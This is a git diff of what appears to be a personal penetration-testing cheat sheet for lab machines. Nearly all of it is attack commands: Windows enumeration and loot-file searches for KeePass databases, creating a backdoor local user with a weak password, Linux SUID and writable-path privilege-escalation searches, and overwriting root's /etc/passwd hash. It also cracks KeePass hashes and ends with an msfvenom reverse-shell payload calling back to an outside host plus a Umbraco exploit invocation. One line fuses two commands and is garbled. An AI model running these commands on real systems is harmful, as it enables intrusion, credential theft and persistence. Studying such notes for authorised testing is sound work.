@@ -901,10 +901,13 @@ C:\Users\dave>whoami
 whoami
 clientwk220\dave
 
+# currnet user's privilege
+C:\Users\dave>whoami /priv
+
 # Group memberships of the current user
 whoami /groups
 
-# Existing users and groups
+# Existing other users and groups
 net user || Get-LocalUser
 net localgroup || Get-LocalGroup
 Get-LocalGroupMember adminteam
@@ -927,10 +930,8 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
 
 # Running processes
 Get-Process
-```
 
-### Search for juicy files on Windows
-```bash
+# Search for juicy files on Windows
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.pdf,*.log -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
@@ -940,11 +941,22 @@ Get-History
 (Get-PSReadlineOption).HistorySavePath
 ```
 
-
-### runas other user
+### Windows runas other user
 ```bash
 runas /user:backupadmin cmd
 ```
+
+### Add user on windows
+```bash
+Net User /Add <newusername>
+
+#set password
+net user <newusername> password123!
+
+#add user to a group
+net localgroup <groupname> <username> /add
+```
+
 
 ### Cross Compiling
 ```bash
@@ -963,14 +975,8 @@ keepass2john Database.kdbx > keepass.hash
 hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force 
 ```
 
-### Add user on windows
-```bash
-Net User /Add lazyadmin
-net user admin password123!
-net localgroup <groupname> <username> /add
-```
 
-### Linux enumeration: must search on directory traversal
+### Linux enumeration: must search ssh related files on directory traversal
 ```bash
 /home/user/.ssh/id_ecdsa
 /home/user/.ssh/id_eddsa
@@ -982,7 +988,6 @@ net localgroup <groupname> <username> /add
 ```bash
 # search for / (root), /tmp, /var/backups
 ```
-
 
 ### Linux Enumeration: automated with lse.sh
 ```bash
@@ -1000,13 +1005,18 @@ dpkg -l | grep <program>
 
 ### Linux Privesc Setuid Binaries and Capabilities
 ```bash
-find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 
+$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 
 2> /dev/null
 
 /usr/sbin/getcap -r / 2>/dev/null
 ```
 
-### Linux find all writable files in /etc/
+### Linux Privesc find writable and executable ###
+```bash
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+```
+
+### Linux Privesc find all writable files in /etc/
 ```bash
 $ find /etc -maxdepth 1 -writable -type f
 ```
@@ -1020,7 +1030,6 @@ $ find /etc -maxdepth 1 -readable -type f
 ```bash
 $ find / -executable -writable -type d 2> /dev/null
 ```
-
 
 ### gcc for mysql exploit (example): This is possbile when root's password is set to ''
 ```bash
@@ -1051,6 +1060,7 @@ select @@hostname;
 ### linux change to root user
 ```bash
 su
+sudo su
 ```
 
 ### Password cracking with john
@@ -1068,15 +1078,11 @@ ls -l /etc/shadow
 ```bash
 # replace x of root's from /etc/passwd file (When have permissions)
 openssl passwd 'passwd'
-
 ```
 
-### Linux find writable and executable ###
-```bash
-find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
-```
 
-### Umbraco 7.12.4 exploit
+
+### Privesc: Umbraco 7.12.4 exploit
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=7777 -f exe > revshell7777.exe$ python -m http.server --bind 10.10.15.222 8080
 $ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command ls'
